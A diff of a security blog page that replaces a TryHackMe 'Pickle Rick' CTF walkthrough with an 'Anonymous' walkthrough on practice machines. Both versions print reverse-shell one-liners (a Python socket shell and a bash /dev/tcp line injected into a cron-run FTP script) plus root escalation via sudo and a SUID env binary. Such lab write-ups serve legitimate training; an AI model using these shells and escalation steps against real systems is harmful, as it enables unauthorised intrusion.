@@ -90,7 +90,7 @@
 <link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="tryhackme,solutions,CTF,command injection,privilege escalation,directory scanning," />
+  <meta name="keywords" content="tryhackme,solutions,CTF,suid,privilege escalation,ftp,cron jobs,smb," />
 
 
 
@@ -116,18 +116,18 @@
 
 
 
-<meta name="description" content="Pickle Rick is a Rick and Morty themed CTF challenge. It requires you to exploit the webserver and find 3 ingredients that will help Rick make his potion to transform himself back to human from a pickle. This is an easy challenge that can teach you directory scanning, command injection, Sudo privilege escalation, etc.">
-<meta name="keywords" content="tryhackme, solutions, CTF, command injection, privilege escalation, directory scanning">
+<meta name="description" content="Anonymous is a beginner CTF privesc challenge. You need to find 2 flags to complete the hack. This machine teaches us to gain access using cron jobs and privilege escalation using SUID binary.">
+<meta name="keywords" content="tryhackme, solutions, CTF, suid, privilege escalation, ftp, cron jobs, smb">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[TryHackMe] Pickle Rick Walkthrough">
-<meta property="og:url" content="http://0.0.0.0:8000/tryhackme/2020/05/15/pickle-rick/">
+<meta property="og:title" content="[TryHackMe] Anonymous Walkthrough">
+<meta property="og:url" content="http://0.0.0.0:8000/tryhackme/2020/06/05/anonymous/">
 <meta property="og:site_name" content="n0nu11">
-<meta property="og:description" content="Pickle Rick is a Rick and Morty themed CTF challenge. It requires you to exploit the webserver and find 3 ingredients that will help Rick make his potion to transform himself back to human from a pickle. This is an easy challenge that can teach you directory scanning, command injection, Sudo privilege escalation, etc.">
+<meta property="og:description" content="Anonymous is a beginner CTF privesc challenge. You need to find 2 flags to complete the hack. This machine teaches us to gain access using cron jobs and privilege escalation using SUID binary.">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="/assets/images/picklerick/picklerick2.jpg"> <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="[TryHackMe] Pickle Rick Walkthrough">
-<meta name="twitter:description" content="Pickle Rick is a Rick and Morty themed CTF challenge. It requires you to exploit the webserver and find 3 ingredients that will help Rick make his potion to transform himself back to human from a pickle. This is an easy challenge that can teach you directory scanning, command injection, Sudo privilege escalation, etc.">
-<meta name="twitter:image" content="https://media.giphy.com/media/9zXWAIcr6jycE/giphy.gif">
+<meta property="og:image" content="/assets/images/05062020-anonymous/anonymous0.png"> <meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[TryHackMe] Anonymous Walkthrough">
+<meta name="twitter:description" content="Anonymous is a beginner CTF privesc challenge. You need to find 2 flags to complete the hack. This machine teaches us to gain access using cron jobs and privilege escalation using SUID binary.">
+<meta name="twitter:image" content="/assets/images/05062020-anonymous/anonymous0.png">
 
 
 <script type="text/javascript" id="hexo.configurations">
@@ -160,7 +160,7 @@
 
 
 
-  <title>[TryHackMe] Pickle Rick Walkthrough | n0nu11</title>
+  <title>[TryHackMe] Anonymous Walkthrough | n0nu11</title>
   
 
 
@@ -355,7 +355,7 @@
   
 
   <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://0.0.0.0:8000/tryhackme/2020/05/15/pickle-rick/">
+    <link itemprop="mainEntityOfPage" href="http://0.0.0.0:8000/tryhackme/2020/06/05/anonymous/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="n0nu11">
@@ -375,7 +375,7 @@
           <h2 class="post-title" itemprop="name headline">
           
           
-            [TryHackMe] Pickle Rick Walkthrough
+            [TryHackMe] Anonymous Walkthrough
           
         </h2>
         
@@ -389,8 +389,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-15T20:40:18+05:30">
-                15-05-2020
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-05T20:40:18+05:30">
+                05-06-2020
               </time>
             
 
@@ -477,7 +477,7 @@
                   <span class="post-meta-item-text">Reading time</span>
                 
                 <span title="Reading time">
-                  3
+                  4
                 </span>
               
             </div>
@@ -486,7 +486,7 @@
           
             
                 <div class="post-description">
-                    Pickle Rick is a Rick and Morty themed CTF challenge. It requires you to exploit the webserver and find <b>3</b> ingredients that will help Rick make his potion to transform himself back to human from a pickle. This is an easy challenge that can teach you directory scanning, command injection, Sudo privilege escalation, etc.
+                    Anonymous is a beginner CTF privesc challenge. You need to find 2 flags to complete the hack. This machine teaches us to gain access using cron jobs and privilege escalation using SUID binary.
                 </div>
             
           
@@ -518,215 +518,222 @@
 
   <h1 id="introduction">Introduction</h1>
 
-<p>Pickle Rick is a Rick and Morty themed CTF challenge. It requires you to exploit the webserver and find <strong>3</strong> ingredients that will help Rick make his potion to transform himself back to human from a pickle.</p>
+<p>Anonymous is a beginner CTF privesc challenge. You need to find 2 flags to complete the hack. This machine teaches us to gain access using cron jobs and privilege escalation using SUID binary.</p>
 
-<p>This is an easy challenge that can teach you directory scanning, command injection, Sudo privilege escalation, etc.</p>
+<p><img src="/assets/images/05062020-anonymous/anonymous0.png" alt="anonymous image" /></p>
 
-<p><img src="https://media.giphy.com/media/9zXWAIcr6jycE/giphy.gif" alt="picklerick" /></p>
-
-<hr />
-
-<h1 id="nmap">Nmap</h1>
-
-<p>let’s start with the Nmap scan.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">-A</span> <span class="nt">-T4</span> 10.10.159.88 <span class="nt">-oN</span> nmap/fullscan
-</code></pre></td></tr></tbody></table></div></div>
-
-<p><img src="/assets/images/picklerick/picklericknmap.png" alt="nmap" /></p>
-
-<p>This may take a while. Why not grab a juice?</p>
-
-<p><img src="https://media.giphy.com/media/skwCXPNUY1MUU/giphy.gif" alt="juice" /></p>
-
-<p><img src="/assets/images/picklerick/picklericknmap2.png" alt="nmap2" /></p>
-
-<p><strong>SSH</strong> and <strong>Webserver</strong> is open. SSH can wait, let’s check the webserver.</p>
-
-<p><img src="/assets/images/picklerick/picklerick2.png" alt="" /></p>
-
-<p>Nothing interesting here, let’s check the source code!.</p>
-
-<p><img src="/assets/images/picklerick/picklericksource.png" alt="" /></p>
-
-<p>There’s a comment by Rick. His Username is <strong>R1ckRul3s.</strong> Hmmm a username? there’s no login page to use the username. Maybe SSH login?. let’s try it.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>ssh R1ckRul3s@10.10.159.88
-</code></pre></td></tr></tbody></table></div></div>
-
-<p><img src="/assets/images/picklerick/picklericksshfail.png" alt="" /></p>
-
-<p>SSH is kicking us out. We cant use SSH now.</p>
-
-<hr />
-
-<h1 id="directory-scanning">Directory Scanning</h1>
-
-<p>Lets fire up the <strong>Dirbuster</strong> and scan the directories. I tried looking for <strong>php</strong> and <strong>txt</strong> files.</p>
-
-<p><img src="/assets/images/picklerick/picklerickds.png" alt="" /></p>
-
-<p><img src="https://media.giphy.com/media/RmfzOLuCJTApa/giphy.gif" alt="" /></p>
-
-<p>We got</p>
-
-<ul>
-  <li>robots.txt</li>
-  <li>login.php</li>
-  <li>portal.php</li>
-</ul>
+<h1 id="enumeration">Enumeration</h1>
 
 <blockquote>
-  <p>Assets and Icons directory had a bunch of GIF and JPEG images with other static files. I tried Steganography against JPEG images but no luck.</p>
+  <p>Enumeration is defined as the process of extracting user names, machine names, network resources, shares, and services from a system. … The gathered information is used to identify the vulnerabilities or weak points in system security and tries to exploit the System gaining phase.</p>
 </blockquote>
 
-<p>Let’s check <strong>robots.txt</strong> file.</p>
+<p>Let’s start the enumeration process. Heuristic tinkering/passive scanning shows that there was no webserver running but FTP and SSH is running.</p>
 
-<p><img src="/assets/images/picklerick/picklerickrobots.png" alt="" /></p>
+<h2 id="nmap">Nmap</h2>
 
-<p><code class="highlighter-rouge">Wubbalubbadubdub</code> ? Interesting, maybe a password? Let’s save it, It may come handy later.</p>
+<blockquote>
+  <p>Nmap is a free and open-source network scanner created by Gordon Lyon. Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. Nmap provides a number of features for probing computer networks, including host discovery and service and operating system detection.</p>
+</blockquote>
 
-<p><img src="https://media.giphy.com/media/l41lI4bYmcsPJX9Go/giphy.gif" alt="" /></p>
+<p>Aggressive Nmap scan shows us the ports <code class="highlighter-rouge">21,22,139,445</code> are open.</p>
 
-<p>Now lets check <strong>login.php</strong></p>
+<p><code class="highlighter-rouge">nmap -p- -A -T4 10.10.3.190 -oN nmap/full</code></p>
 
-<p>A login page finally!, let’s try the username <code class="highlighter-rouge">R1ckRul3s</code> and the password <code class="highlighter-rouge">Wubbalubbadubdub</code>.</p>
+<p><img src="/assets/images/05062020-anonymous/anonymous1.1.png" alt="nmap" /></p>
 
-<p><img src="/assets/images/picklerick/picklericklogin.png" alt="" /></p>
+<p>The <strong>FTP</strong>, <strong>SMB</strong> and <strong>SSH</strong> ports are open. let’s try enumerating the SMB shares first.</p>
 
-<p>And it worked! We’re in <strong>portal.php</strong></p>
+<h2 id="smb">SMB</h2>
 
-<p><img src="/assets/images/picklerick/picklerickportal.png" alt="" /></p>
+<p>let’s check the shares available.</p>
 
-<p><img src="https://media.giphy.com/media/i2dE5VvBNxBw4/giphy.gif" alt="" /></p>
+<p><img src="/assets/images/05062020-anonymous/anonymous5.png" alt="enumeration" /></p>
+
+<p>Looks like <code class="highlighter-rouge">pics</code> share is available, with the comment <code class="highlighter-rouge">My SMB Share Directory for Pics</code>.</p>
+
+<p><strong>Pics</strong>? maybe something hidden inside using steganography?.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous6.png" alt="smb file listing" /></p>
+
+<p>We can see 2 image files <code class="highlighter-rouge">corgo2.jpg</code> and <code class="highlighter-rouge">puppos.jpeg</code>. let’s download it to our machine.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous7.png" alt="downloading files" /></p>
+
+<p>I tried <code class="highlighter-rouge">binwalk</code> on both files, turned out only <code class="highlighter-rouge">puppos.jpeg</code> file had something embedded inside. a TIFF file</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous8.png" alt="binwalk" /></p>
+
+<p>let’s try to extract the embedded contents.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous9.png" alt="binwalk extraction" /></p>
+
+<p>The <code class="highlighter-rouge">C</code> file is the one embedded inside <code class="highlighter-rouge">puppos.jpeg</code>. I checked the file for some information but I got nothing in the end.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous10.png" alt="rabbit hole" /></p>
+
+<p>It was a rabbit hole.</p>
+
+<p><img src="https://media.giphy.com/media/zLCiUWVfex7ji/giphy.gif" alt="no results found" /></p>
+
+<p>Let’s move on to FTP and check if we get something interesting.</p>
+
+<h2 id="ftp">FTP</h2>
+
+<p>Let’s check for anonymous login via FTP.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous2.png" alt="ftp" /></p>
+
+<p>It worked. let’s check the contents.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous3.png" alt="ftp files list" /></p>
+
+<p>there are 3 interesting files <code class="highlighter-rouge">clean.sh</code>, <code class="highlighter-rouge">removed_files.log</code> and <code class="highlighter-rouge">to_do.txt</code>.</p>
+
+<p>let’s download the files to our kali machine.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous4.png" alt="get files from ftp" /></p>
+
+<h4 id="file-cleansh">FILE: clean.sh</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12</pre></td><td class="code"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">tmp_files</span><span class="o">=</span>0
+<span class="nb">echo</span> <span class="nv">$tmp_files</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$tmp_files</span><span class="o">=</span>0 <span class="o">]</span>
+<span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Running cleanup script:  nothing to delete"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log
+<span class="k">else
+    for </span>LINE <span class="k">in</span> <span class="nv">$tmp_files</span><span class="p">;</span> <span class="k">do
+        </span><span class="nb">rm</span> <span class="nt">-rf</span> /tmp/<span class="nv">$LINE</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> | Removed file /tmp/</span><span class="nv">$LINE</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log<span class="p">;</span><span class="k">done
+fi</span>
+
+</code></pre></td></tr></tbody></table></div></div>
+
+<h4 id="file-removed_fileslog">FILE: removed_files.log</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13</pre></td><td class="code"><pre class="highlight"><code>Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+</code></pre></td></tr></tbody></table></div></div>
+
+<h4 id="file-to_dotxt">FILE: to_do.txt</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2</pre></td><td class="code"><pre class="highlight"><code>I really need to disable the anonymous login...it's really not safe
+
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>Indeed it is. Too late bruh! I already got the file 😆.</p>
+
+<p><img src="https://media.giphy.com/media/dZjlm0hDSBQYbDZQc9/giphy.gif" alt="too late" /></p>
+
+<p>Looks like the <code class="highlighter-rouge">clean.sh</code> file is running somewhere in the machine repeatedly that is generating that log file and it seems like we have write permission in FTP. What if we inject our code in the <code class="highlighter-rouge">clean.sh</code> file and get a reverse shell?</p>
+
+<p><img src="https://media.giphy.com/media/vJc55OQZMOojS/giphy.gif" alt="anonymous" /></p>
 
 <hr />
 
-<h1 id="command-injection">Command Injection</h1>
+<h1 id="gaining-access-reverse-shell">Gaining Access: Reverse Shell</h1>
 
-<p>Remember <strong>portal.php</strong> ?. Its says command panel. Can it run Linux commands?. Let’s check it out.</p>
+<p>First, we will mount the FTP as a file share and edit files using <code class="highlighter-rouge">curlFTPfs</code>.</p>
 
-<p><img src="/assets/images/picklerick/picklerickciid.png" alt="" /></p>
+<p><img src="/assets/images/05062020-anonymous/anonymous11.png" alt="curlFTPfs" /></p>
 
-<p>Yes, It does. Let’s check the files.</p>
+<p>add <code class="highlighter-rouge">bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code> in <code class="highlighter-rouge">clean.sh</code> file.</p>
 
-<p><img src="/assets/images/picklerick/picklerickcils.png" alt="" /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12</pre></td><td class="code"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1
+<span class="nv">tmp_files</span><span class="o">=</span>0
+<span class="nb">echo</span> <span class="nv">$tmp_files</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$tmp_files</span><span class="o">=</span>0 <span class="o">]</span>
+<span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Running cleanup script:  nothing to delete"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log
+<span class="k">else
+    for </span>LINE <span class="k">in</span> <span class="nv">$tmp_files</span><span class="p">;</span> <span class="k">do
+        </span><span class="nb">rm</span> <span class="nt">-rf</span> /tmp/<span class="nv">$LINE</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> | Removed file /tmp/</span><span class="nv">$LINE</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log<span class="p">;</span><span class="k">done
+fi</span>
 
-<p><code class="highlighter-rouge">Sup3rS3cretPickl3Ingred.txt</code>? It looks like we found our first ingredient!.</p>
-
-<p>let’s see what’s inside the <code class="highlighter-rouge">Sup3rS3cretPickl3Ingred.txt</code> using <code class="highlighter-rouge">cat</code> command.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code><span class="nb">cat </span>Sup3rS3cretPickl3Ingred.txt
 </code></pre></td></tr></tbody></table></div></div>
 
-<p><img src="/assets/images/picklerick/picklerickcatfail.png" alt="" /></p>
+<blockquote>
+  <p>Replace the &lt;ip&gt; and &lt;port&gt; with your ip and port number.</p>
+</blockquote>
 
-<p>Uh oh!. We can’t use <code class="highlighter-rouge">cat</code> command. Let’s try <code class="highlighter-rouge">less</code> command then.</p>
+<p>now let’s open a Netcat listener using <code class="highlighter-rouge">nc -lvnp &lt;port&gt;</code>. wait for the <code class="highlighter-rouge">clean.sh</code> to run so that we can get a reverse shell.</p>
 
-<p><img src="/assets/images/picklerick/picklerickciless.png" alt="" /></p>
+<p><img src="https://media.giphy.com/media/xUPJPop2o56Sv8p8TS/giphy.gif" alt="5 hours later" /></p>
 
-<p>Ah! Finally one ingredient found. 2 more to go. Hold on Rick!.</p>
+<p><img src="/assets/images/05062020-anonymous/anonymous13.png" alt="netcat listener" /></p>
 
-<p><img src="https://media.giphy.com/media/Rgo50jdPhiJRiGQH9C/giphy.gif" alt="" /></p>
+<p>And we got it.</p>
+
+<p><img src="https://media.giphy.com/media/iOm1xOSfAtPzmPXJqH/giphy.gif" alt="we got him gif" /></p>
+
+<p>The file <code class="highlighter-rouge">user.txt</code> contains the user flag.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous14.png" alt="user flag" /></p>
 
 <hr />
-
-<h1 id="reverse-shell">Reverse Shell</h1>
-
-<p>Since we have command injection ability, let’s get a reverse shell. Head to <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey reverse shell cheatsheet</a>.</p>
-
-<p>Start a netcat listener in the terminal.</p>
-
-<p><img src="/assets/images/picklerick/picklerickrs.png" alt="" /></p>
-
-<p>and run</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;YOUR IP&gt;",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
-</code></pre></td></tr></tbody></table></div></div>
-
-<blockquote>
-  <p>Python 2 wasn’t available but python 3 was. So I tired reverse shell with python 3.
-Replace your IP address with &lt;YOUR IP&gt;</p>
-</blockquote>
-
-<p>And we got the shell! 💪</p>
-
-<p><img src="/assets/images/picklerick/picklerickshell1.png" alt="" /></p>
-
-<p>Now let’s find other ingredients.</p>
-
-<p><code class="highlighter-rouge">ls /home</code> revealed the <strong>rick</strong> folder.</p>
-
-<p><img src="/assets/images/picklerick/picklerickshell2.png" alt="" /></p>
-
-<p>let’s check the /rick folder.</p>
-
-<p><img src="/assets/images/picklerick/picklerickshell3.png" alt="" /></p>
-
-<p>Huh! the second ingredient. cool.</p>
-
-<p><img src="/assets/images/picklerick/picklerickshell4.png" alt="" /></p>
-
-<p>The 2nd Ingredient is <strong>1 jerry tear</strong>.</p>
-
-<blockquote>
-  <p>I checked for 3rd ingredient but unfortunately i can’t able to find it. It seems like it is hidden inside /root folder. We need the root access to get the 3rd ingredient.</p>
-</blockquote>
 
 <h1 id="privilege-escalation">Privilege Escalation</h1>
 
-<p>Let’s check if we have any root access.</p>
+<p><code class="highlighter-rouge">sudo -l</code> asked for a password. Since we don’t know the password we can skip it.</p>
 
-<p><code class="highlighter-rouge">sudo -l</code></p>
+<p>This time I used <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">linpeas</a> script to enumerate the Linux machine.</p>
 
-<p><img src="/assets/images/picklerick/picklerickshell5.png" alt="" /></p>
+<p><img src="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/peass.png" alt="linpeas" /></p>
 
-<p><code class="highlighter-rouge">sudo -l</code> shows that we can run any command as root without password. Hurray!</p>
+<p>When checking for SUID binaries. we can see <code class="highlighter-rouge">/usr/bin/env</code> has setuid bit set with <strong>root</strong> privileges. This means we can get a root shell by using <code class="highlighter-rouge">env</code> command.</p>
 
-<p><img src="https://media.giphy.com/media/5VKbvrjxpVJCM/giphy.gif" alt="wow" /></p>
+<p><img src="/assets/images/05062020-anonymous/anonymous15.png" alt="setuid binary" />
+<img src="/assets/images/05062020-anonymous/anonymous16.png" alt="setuid flag" /></p>
 
-<p>Let’s get the root shell now.</p>
+<p>Let’s head to <a href="https://gtfobins.github.io/gtfobins/env/">gtfobins</a> for the escalation command.</p>
 
-<p><code class="highlighter-rouge">sudo /bin/bash</code></p>
+<p><img src="/assets/images/05062020-anonymous/anonymous17.png" alt="gtfobin command" /></p>
 
-<p><img src="/assets/images/picklerick/pickleshell6.png" alt="" /></p>
+<p>lets try executing <code class="highlighter-rouge">/usr/bin/env /bin/sh -p</code></p>
 
-<p>Finally we have root access!</p>
+<p><img src="/assets/images/05062020-anonymous/anonymous18.png" alt="priv esc" /></p>
 
-<p>Let’s find the 3rd ingredient to save Rick!.</p>
+<p>And we got a <strong>root</strong> shell.</p>
 
-<p><img src="/assets/images/picklerick/picklerickshell7.png" alt="" /></p>
+<p>With the root shell, we can read the contents of the root directory <em>(Actually we can read anything)</em> which contains the root flag.</p>
 
-<p>As I thought there’s the 3rd ingredient. Let’s get it!.</p>
+<p><img src="/assets/images/05062020-anonymous/anonymous19.png" alt="root flag" /></p>
 
-<p><img src="/assets/images/picklerick/picklerickshell8.png" alt="" /></p>
-
-<p>We got all the 3 ingredients. Time to save Rick.</p>
-
-<p><img src="/assets/images/picklerick/picklerickfinal.png" alt="" /></p>
-
-<p>And we are Done!. Hurray!</p>
-
-<p><img src="https://media.giphy.com/media/l41JU9pUyosHzWyuQ/giphy.gif" alt="done" /></p>
+<p><img src="https://media.giphy.com/media/3og0ILLVvPp8d64Jd6/giphy.gif" alt="game over" /></p>
 
 <hr />
 
 <h1 id="summary">Summary</h1>
 
 <ul>
-  <li>Nmap scan showed 2 ports open, 22 (ssh), and 80 (webserver).</li>
-  <li>SSH denied access for any credentials making it useless for this challenge.</li>
-  <li>port 80 is up and running. checking its source revealed the username.</li>
-  <li>The Directory Scanner against webserver revealed login.php,robots.txt,portal.php</li>
-  <li>The robots.txt file revealed the password.</li>
-  <li>The credentials obtained are used in login.php which redirected to portal.php on successful login.</li>
-  <li>portal page had command injection vulnerability which then used to get the 1st ingredient.</li>
-  <li>A reverse shell is obtained using command injection.</li>
-  <li>The home directory contained a rick folder which then contained the 2nd ingredient.</li>
-  <li>sudo -l command revealed that we can run any command as root without password.</li>
-  <li>sudo /bin/bash to obtain a root shell.</li>
-  <li>The /root folder contained the 3rd ingredient.</li>
+  <li>Nmap scan shows SSH, FTP and SMB ports are open</li>
+  <li>pics share was available in SMB which contains 2 image files.</li>
+  <li>The image files are nothing but the rabbit holes.</li>
+  <li>FTP had 3 files clean.sh, removed_files.log and to_do.txt</li>
+  <li>We identified that clean.sh was running somewhere, it may be using cron jobs.</li>
+  <li>To gain access, we first mount the FTP as a filesystem and injected reverse shell command.</li>
+  <li>With Netcat listener listening on the local kali machine, we got a reverse shell.</li>
+  <li>The user.txt contained a user flag.</li>
+  <li>For privilege escalation, the host machine is enumerated using linpeas script.</li>
+  <li>It showed the /usr/bin/env was set with setuid as root.</li>
+  <li>Using the command from gtfobins, we use env command to escalate root privilege.</li>
+  <li>The root flag was found in /root directory.</li>
 </ul>
+
+<hr />
 
 <h1 id="before-you-leave">Before you leave</h1>
 
@@ -734,7 +741,7 @@ Replace your IP address with &lt;YOUR IP&gt;</p>
 
 <p>Follow me on  <a href="https://github.com/devwaseem"> <i class="fa fa-github"></i> Github</a>, <a href="https://twitter.com/iamwaseem99"><i class="fa fa-twitter"></i> Twitter</a>, <a href="https://www.instagram.com/dvlp.er/"><i class="fa fa-instagram"></i> Instagram</a>, <a href="https://www.facebook.com/dvlprwaseem"><i class="fa fa-facebook"></i> Facebook</a>, <a href="https://www.linkedin.com/in/devwaseem/"><i class="fa fa-linkedin"></i> LinkedIn</a>.</p>
 
-<p><img src="https://media.giphy.com/media/TfFDiw5gBuEns4ykJl/giphy.gif" alt="bye" /></p>
+<p><img src="https://media.giphy.com/media/42D3CxaINsAFemFuId/giphy.gif" alt="bye" /></p>
 
 
       
@@ -775,13 +782,19 @@ Replace your IP address with &lt;YOUR IP&gt;</p>
             <a href="/tag/#/CTF" rel="tag"># CTF</a>
           
             
-            <a href="/tag/#/command%20injection" rel="tag"># command injection</a>
+            <a href="/tag/#/suid" rel="tag"># suid</a>
           
             
             <a href="/tag/#/privilege%20escalation" rel="tag"># privilege escalation</a>
           
             
-            <a href="/tag/#/directory%20scanning" rel="tag"># directory scanning</a>
+            <a href="/tag/#/ftp" rel="tag"># ftp</a>
+          
+            
+            <a href="/tag/#/cron%20jobs" rel="tag"># cron jobs</a>
+          
+            
+            <a href="/tag/#/smb" rel="tag"># smb</a>
           
         </div>
       
@@ -797,18 +810,14 @@ Replace your IP address with &lt;YOUR IP&gt;</p>
         <div class="post-nav" id="post-nav-id">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/tryhackme/2020/06/05/anonymous/" rel="next" title="[TryHackMe] Anonymous Walkthrough">
-                <i class="fa fa-chevron-left"></i> [TryHackMe] Anonymous Walkthrough
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/personal/2020/05/13/init5-how-it-all-started/" rel="prev" title="Init 5: How it all started">
-                Init 5: How it all started <i class="fa fa-chevron-right"></i>
+              <a href="/tryhackme/2020/05/15/pickle-rick/" rel="prev" title="[TryHackMe] Pickle Rick Walkthrough">
+                [TryHackMe] Pickle Rick Walkthrough <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -1049,7 +1058,7 @@ Replace your IP address with &lt;YOUR IP&gt;</p>
             
               <div class="post-toc-content">
     <ol class=nav>
-      <li class="nav-item nav-level-1"> <a class="nav-link" href="#introduction"> <span class="nav-number">1</span> <span class="nav-text">Introduction</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#nmap"> <span class="nav-number">2</span> <span class="nav-text">Nmap</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#directory-scanning"> <span class="nav-number">3</span> <span class="nav-text">Directory Scanning</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#command-injection"> <span class="nav-number">4</span> <span class="nav-text">Command Injection</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#reverse-shell"> <span class="nav-number">5</span> <span class="nav-text">Reverse Shell</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#privilege-escalation"> <span class="nav-number">6</span> <span class="nav-text">Privilege Escalation</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#summary"> <span class="nav-number">7</span> <span class="nav-text">Summary</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#before-you-leave"> <span class="nav-number">8</span> <span class="nav-text">Before you leave</span> </a> </li>
+      <li class="nav-item nav-level-1"> <a class="nav-link" href="#introduction"> <span class="nav-number">1</span> <span class="nav-text">Introduction</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#enumeration"> <span class="nav-number">2</span> <span class="nav-text">Enumeration</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#nmap"> <span class="nav-number">2.1</span> <span class="nav-text">Nmap</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#smb"> <span class="nav-number">2.2</span> <span class="nav-text">SMB</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#ftp"> <span class="nav-number">2.3</span> <span class="nav-text">FTP</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-4"> <a class="nav-link" href="#file-cleansh"> <span class="nav-number">2.3.1</span> <span class="nav-text">FILE: clean.sh</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#file-removed_fileslog"> <span class="nav-number">2.3.2</span> <span class="nav-text">FILE: removed_files.log</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#file-to_dotxt"> <span class="nav-number">2.3.3</span> <span class="nav-text">FILE: to_do.txt</span> </a> </li> </ol> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#gaining-access-reverse-shell"> <span class="nav-number">3</span> 